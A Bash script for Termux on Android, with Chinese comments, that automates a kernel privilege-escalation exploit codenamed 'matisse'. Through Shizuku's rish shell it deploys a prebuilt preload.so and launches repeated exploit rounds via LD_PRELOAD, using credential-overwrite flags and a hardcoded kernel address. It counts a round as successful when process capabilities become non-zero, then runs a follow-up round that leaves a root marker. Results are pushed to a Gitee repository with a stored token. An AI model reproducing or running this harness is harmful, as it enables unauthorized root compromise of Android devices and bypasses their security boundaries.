#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# matisse 现场全自动脚本 v4 (评审维护, 零判断执行)
# 用法: Termux 里 `bash field_auto.sh`
# v4: 部署 mt61 (窗口 2s->20s, 修 consumer 被负载饿出窗) /
#     负载闸全部移除 (日常负载从不<3, 闸只剩浪费; load 仅记录) /
#     开火加 PSELECT_WINDOW_SECONDS=20 / 修复 v3 残留计数小 bug
# ============================================================
set -u
TOKEN=$(cat "$HOME/.matisse_token" 2>/dev/null | tr -d ' \r\n' || true)
if [ -n "$TOKEN" ]; then
  REPO_URL="https://ihamn:${TOKEN}@gitee.com/ihamn/matisse.git"
else
  REPO_URL="https://gitee.com/ihamn/matisse.git"
  echo "[card] 警告: 无令牌文件, 回传推送会失败(拉取/开火不受影响)"
fi
WORK="$HOME/matisse"
RUN_TS=$(date +%Y%m%d_%H%M%S)
CONSOLE_LOG="$HOME/card_console_${RUN_TS}.log"
PUSHED=0; EXTRA=""; R11_GATE=""; R12_GATE=""; C1_FIRED=0
command -v termux-wake-lock >/dev/null 2>&1 && termux-wake-lock 2>/dev/null
exec > >(tee -a "$CONSOLE_LOG") 2>&1
say(){ echo "[card] $*"; }
SHIZUKU_DEAD_HINT="!! Shizuku 连接不稳定。手机上做一次(只需一次): 设置->应用管理->Termux和Shizuku->省电策略都改[无限制], 运行期间插充电器+亮屏, 然后重新粘贴运行本脚本"

# ---------- 0. git + 仓库 ----------
say "第0步: 准备 git 和仓库"
command -v git >/dev/null 2>&1 || pkg install -y git >/dev/null 2>&1 || { say "git 安装失败,检查网络"; exit 1; }
[ -d "$WORK/.git" ] || git clone -q "$REPO_URL" "$WORK" || { say "克隆失败,检查网络"; exit 1; }
cd "$WORK" || exit 1
git remote set-url origin "$REPO_URL"
git config user.name "field-termux"; git config user.email "field@termux.local"
git pull -q origin master 2>/dev/null || true
say "仓库就绪: $(git log --oneline -1 | cut -c1-70)"

# ---------- 1. rish ----------
say "第1步: 查找 rish"
RISH=""
for c in "$HOME/rish" "$HOME/rish/rish" "$HOME/storage/downloads/rish" \
         "/sdcard/Download/rish" "/storage/emulated/0/Download/rish" "/data/local/tmp/rish"; do
  [ -f "$c" ] && RISH="$c" && break
done
[ -z "$RISH" ] && RISH=$(find "$HOME" -maxdepth 3 -name rish -type f 2>/dev/null | head -1)
if [ -z "$RISH" ]; then
  say "!! 没找到 rish: Shizuku app->终端应用中使用(rish)->复制到 Download; Termux 执行 termux-setup-storage; cp /sdcard/Download/rish* ~/ ; chmod +x ~/rish*; 重跑"
  exit 2
fi
RISH_DIR=$(dirname "$RISH"); chmod +x "$RISH" 2>/dev/null
RISH_MODE=""
TEST_A=$( (cd "$RISH_DIR" && timeout 30 ./rish "echo RISH_OK_\$(id -u)") 2>&1 )
printf '%s' "$TEST_A" | grep -q "RISH_OK_" && RISH_MODE=args && RISH_OUT="$TEST_A"
if [ -z "$RISH_MODE" ]; then
  TEST_B=$( (cd "$RISH_DIR" && echo 'echo RISH_OK_$(id -u)' | timeout 30 ./rish) 2>&1 )
  printf '%s' "$TEST_B" | grep -q "RISH_OK_" && RISH_MODE=stdin && RISH_OUT="$TEST_B"
fi
[ -z "$RISH_MODE" ] && { say "!! rish 无法执行(Shizuku 没在运行?)输出: $TEST_A"; exit 2; }
say "rish 模式: $RISH_MODE 身份: $(printf '%s' "$RISH_OUT" | tr '\n' ' ')"
rsh1(){ local cmd="$1" t="${2:-60}"
  if [ "$RISH_MODE" = args ]; then (cd "$RISH_DIR" && timeout "$t" ./rish "$cmd") 2>&1
  else printf '%s\n' "$cmd" | (cd "$RISH_DIR" && timeout "$t" ./rish) 2>&1; fi; }
rsh(){ local cmd="$1" t="${2:-60}" out i
  for i in 1 2 3 4; do
    out=$(rsh1 "$cmd" "$t")
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 4 ] && say "Shizuku 连接闪断(第${i}次), 8秒后重试..." >&2
    sleep 8
  done
  printf '%s\n' "$out"; return 1; }
rpush(){ local l="$1" r="$2" out i
  for i in 1 2 3 4; do
    if [ "$RISH_MODE" = args ]; then out=$( (cd "$RISH_DIR" && timeout 180 ./rish "cat > '$r'") < "$l" 2>&1 )
    else out=$( { echo "cat > '$r'"; cat "$l"; } | (cd "$RISH_DIR" && timeout 180 ./rish) 2>&1 ); fi
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 4 ] && say "Shizuku 连接闪断(第${i}次), 8秒后重试..." >&2
    sleep 8
  done
  printf '%s\n' "$out"; return 1; }

# ---------- 2. 部署 mt61 (SHA 机器校验) ----------
say "第2步: 部署 mt61 preload.so 并校验 SHA256"
[ -f "$WORK/bin/mt61/preload.so" ] || { say "!! 仓库里没有 bin/mt61/preload.so"; exit 3; }
SHA_EXP=$(grep -o '[0-9a-f]\{64\}' "$WORK/bin/mt61/BUILD_INFO.txt" 2>/dev/null | head -1)
rsh "rm -f /data/local/tmp/preload.new" 20 >/dev/null
rpush "$WORK/bin/mt61/preload.so" "/data/local/tmp/preload.new" >/dev/null
rsh "mv -f /data/local/tmp/preload.new /data/local/tmp/preload.so; chmod 644 /data/local/tmp/preload.so" 30 >/dev/null
SHA_GOT=$(rsh "sha256sum /data/local/tmp/preload.so" 30 | tr -d '\r' | awk '{print $1}')
say "期望 SHA: ${SHA_EXP:-未知}"; say "实际 SHA: ${SHA_GOT:-读取失败}"
if [ -n "$SHA_EXP" ] && [ "$SHA_GOT" != "$SHA_EXP" ]; then
  case "$SHA_GOT" in *Request\ timeout*|*"blocked"*) say "$SHIZUKU_DEAD_HINT";; *) say "!! SHA 不一致,中止开火(防错二进制)";; esac
  exit 3
fi
say "二进制校验通过 (mt61: 窗口 20s)"

# ---------- 3. 取证阶段 (零开火) ----------
say "第3步: 取证 (残留进程 + 每线程 state/wchan + 负载记录)"
mkdir -p "$WORK/logs_raw/R11" "$WORK/logs_raw/R12" "$WORK/logs_raw/C1"
FORENSIC="$WORK/logs_raw/R11/forensic_${RUN_TS}.txt"
{ rsh "date; cat /proc/sys/kernel/random/boot_id; getenforce; cat /proc/loadavg; cat /proc/uptime"
  echo "--- residue processes ---"
  rsh "ps -A | grep -E 'sleep|preload' || echo NO_RESIDUE"
  echo "--- per-thread state/wchan of residue ---"
  rsh 'for p in $(ps -A -o PID,NAME | grep -E "sleep|preload" | awk "{print \$1}"); do echo "== pid $p =="; for t in /proc/$p/task/*; do st=$(cat $t/stat 2>/dev/null | awk "{print \$3}"); wc=$(cat $t/wchan 2>/dev/null); cm=$(cat $t/comm 2>/dev/null); echo "tid=$(basename $t) comm=$cm state=$st wchan=$wc"; done; done' 60
} > "$FORENSIC" 2>&1
RESIDUE_FLAG=$(grep -c "state=" "$FORENSIC" 2>/dev/null); RESIDUE_FLAG=${RESIDUE_FLAG:-0}
STUCK_STATES=$(grep -o "state=[DR]" "$FORENSIC" 2>/dev/null | wc -l); STUCK_STATES=${STUCK_STATES:-0}
say "取证落盘: 线程行数=$RESIDUE_FLAG (D/R=$STUCK_STATES)"
if [ "$RESIDUE_FLAG" -gt 0 ]; then
  say "!! 发现残留进程 (线程 $RESIDUE_FLAG 条, D/R 态 $STUCK_STATES 条)"
  say "取证已保存。请现在重启手机 (长按电源->重启), 等 10 分钟后重新粘贴运行本脚本"
  cp "$CONSOLE_LOG" "$WORK/logs_raw/termux_console_${RUN_TS}.log" 2>/dev/null
  git add -A >/dev/null 2>&1; git commit -q -m "v4 forensics ${RUN_TS}: residue found (threads=$RESIDUE_FLAG D/R=$STUCK_STATES) - reboot requested before fire" >/dev/null 2>&1 || true
  for i in 1 2 3; do git pull -q --rebase origin master 2>/dev/null; git push -q origin master 2>/dev/null && break; sleep 10; done
  exit 5
fi
say "无残留, 继续"

# ---------- 4. 体检 (settle 等待; 负载仅记录不拦截) ----------
say "第4步: 体检 (新 boot 自动等满 10 分钟; 负载只记录)"
BOOT0=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r')
case "$BOOT0" in *Request\ timeout*|*"blocked"*|"") say "$SHIZUKU_DEAD_HINT"; exit 4;; esac
ENF0=$(rsh "getenforce" 20 | tr -d '\r')
[ "$ENF0" = "Enforcing" ] || { say "!! enforce=$ENF0 非预期, 停"; exit 4; }
while :; do
  UP=$(rsh "awk '{print int(\$1)}' /proc/uptime" 20 | tr -d '\r')
  case "$UP" in ''|*[!0-9]*) say "uptime 读数异常"; sleep 10; continue;; esac
  [ "$UP" -ge 600 ] && break
  WAIT_S=$((600 - UP)); say "开机仅 ${UP}s, 再等 ${WAIT_S}s ..."; sleep $((WAIT_S > 120 ? 120 : WAIT_S))
done
LOAD0=$(rsh "cat /proc/loadavg" 20 | tr -d '\r')
say "boot=$BOOT0 enforce=$ENF0 settle=OK load=$LOAD0 (仅记录)"
say "体检完成,开始开火"

# ---------- 5. 开火 / 门槛 / 分支 ----------
cleangate(){ local i
  for i in 1 2 3 4; do
    rsh "rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt" 20 >/dev/null
    GONE=$(rsh "ls /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt 2>/dev/null | wc -l" 20 | tr -d '\r ')
    [ "$GONE" = "0" ] && return 0
    say "门槛文件未删净(残留 $GONE), 重试 $i..."
  done
  return 1; }
fire(){ local name="$1" stage="$2" task="$3" te="" rc_line
  [ -n "$task" ] && te=" PSELECT_TASK=$task"
  cleangate || { say "!! $name 门槛文件删不净, 弃打本轮(防陈旧误判)"; return 1; }
  rsh1 "am kill-all" 20 >/dev/null
  local cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=$stage PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=auto PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1$te LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1; echo \"${name}_RC=\$?\""
  say "开火 $name (约4-5分钟,请勿动手机,保持亮屏)..."
  rc_line=$(rsh1 "$cmd" 280 | grep -a "_RC=" | tail -1)
  if [ -z "$rc_line" ]; then
    say "!! $name 未返回 rc 行 (外层超时击杀) -> 标记 CONTAMINATED"
    EXTRA="$EXTRA ${name}=CONTAMINATED"
  else
    say "$rc_line enforce=$(rsh 'getenforce' 20 | tr -d '\r')"
  fi; }
gate(){ local st; st=$(rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r')
  if [ -z "$st" ] || ! printf '%s' "$st" | grep -q "task="; then echo "R_MISS"; return; fi
  if printf '%s' "$st" | grep -q "CapEff=0000000000000000"; then echo "R_MISS"; else echo "R_LANDED"; fi; }
gettask(){ rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r' | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1; }
bootid(){ rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r'; }

fire R11 R ""
R11_GATE=$(gate); say "R11 门槛判定: $R11_GATE"
BOOT1=$(bootid)
if [ "$R11_GATE" = "R_LANDED" ] && [ "$BOOT1" = "$BOOT0" ]; then
  T=$(gettask); say "R 写落地! 立即补 C 轮 TASK=$T"; C1_FIRED=1; fire C1 C "$T"
elif [ "$BOOT1" != "$BOOT0" ]; then
  say "boot 变化, 停止后续轮"; EXTRA="$EXTRA boot_changed"
else
  say "R_MISS, 重掷 R12 (最后一轮)"
  fire R12 R ""
  R12_GATE=$(gate); say "R12 门槛判定: $R12_GATE"
  BOOT2=$(bootid)
  if [ "$R12_GATE" = "R_LANDED" ] && [ "$BOOT2" = "$BOOT0" ]; then
    T=$(gettask); say "R12 落地! 立即补 C 轮 TASK=$T"; C1_FIRED=1; fire C1 C "$T"
  else
    say "两轮未中,按卡停止"; EXTRA="$EXTRA two_miss_stopped"
  fi
fi

# ---------- 6. 回收 + 回传 ----------
say "第6步: 回收数据并回传"
for n in R11 R12; do
  rsh "cat /data/local/tmp/$n.out" 90 > "$WORK/logs_raw/$n/${n}_raw.out" 2>/dev/null
  [ -s "$WORK/logs_raw/$n/${n}_raw.out" ] || rm -f "$WORK/logs_raw/$n/${n}_raw.out"
done
if [ "$C1_FIRED" = 1 ]; then
  rsh "cat /data/local/tmp/C1.out" 90 > "$WORK/logs_raw/C1/C1_raw.out" 2>/dev/null
  [ -s "$WORK/logs_raw/C1/C1_raw.out" ] || rm -f "$WORK/logs_raw/C1/C1_raw.out"
  { rsh "cat /data/local/tmp/root_alive.txt" 20 2>/dev/null; } > "$WORK/logs_raw/C1/root_alive.txt" 2>/dev/null
fi
rsh "cat /data/local/tmp/mt49_child_status.txt" 30 > "$WORK/logs_raw/R11/mt49_status_final.txt" 2>/dev/null
rsh "dumpsys dropbox --print data_app_anr 2>/dev/null | tail -c 200000" 60 > "$WORK/logs_raw/anr_dropbox_${RUN_TS}.txt" 2>/dev/null
ALIVE=$(rsh "getenforce; cat /proc/sys/kernel/random/boot_id; cat /proc/loadavg" 20 | tr -d '\r' | tr '\n' ' ')
say "结束活体: $ALIVE"
SIG_GREP=$(grep -a "mt61: pselect window\|pselect returned\|mt19b\|mt25: futex trigger 0" "$WORK/logs_raw/R11/R11_raw.out" 2>/dev/null | head -8)
IN_WINDOW=$( { grep -a -n "pselect returned\|mt19b: sched attempt" "$WORK/logs_raw/R11/R11_raw.out" 2>/dev/null | head -6; } )
{ echo "# 卡6 Termux 自动运行 v4 $RUN_TS"
  echo "- 取证: 线程行=$RESIDUE_FLAG (D/R=$STUCK_STATES)"
  echo "- 开火前: boot=$BOOT0 enforce=$ENF0 load=$LOAD0 (仅记录)"
  echo "- R11门槛: $R11_GATE / R12门槛: ${R12_GATE:-未跑} / C1开打: $C1_FIRED / $EXTRA"
  echo "- mt61 窗口/落窗签名行:"; echo "$SIG_GREP"
  echo "- 落窗判读行号 (mt19b 在 pselect returned 之前=落窗内):"; echo "$IN_WINDOW"
  echo "- 结束活体: $ALIVE"
} > "$WORK/logs_raw/CARD6_TERMUX_${RUN_TS}.md"
cp "$CONSOLE_LOG" "$WORK/logs_raw/termux_console_${RUN_TS}.log" 2>/dev/null
git add -A >/dev/null 2>&1
git commit -q -m "termux auto card6-v4 ${RUN_TS}: R11=${R11_GATE} R12=${R12_GATE:-skip} C1=$C1_FIRED$EXTRA (mt61 window=20s first fire)" || true
for i in 1 2 3; do
  git pull -q --rebase origin master 2>/dev/null
  git push -q origin master 2>/dev/null && { PUSHED=1; break; }
  say "推送重试 $i..."; sleep 10
done
command -v termux-wake-unlock >/dev/null 2>&1 && termux-wake-unlock 2>/dev/null
say "=========================================="
if [ "$PUSHED" = 1 ]; then
  say "完成! 全部数据已推回 gitee 仓库"
else
  say "推送失败! 把这个文件发给评审: $CONSOLE_LOG"
fi
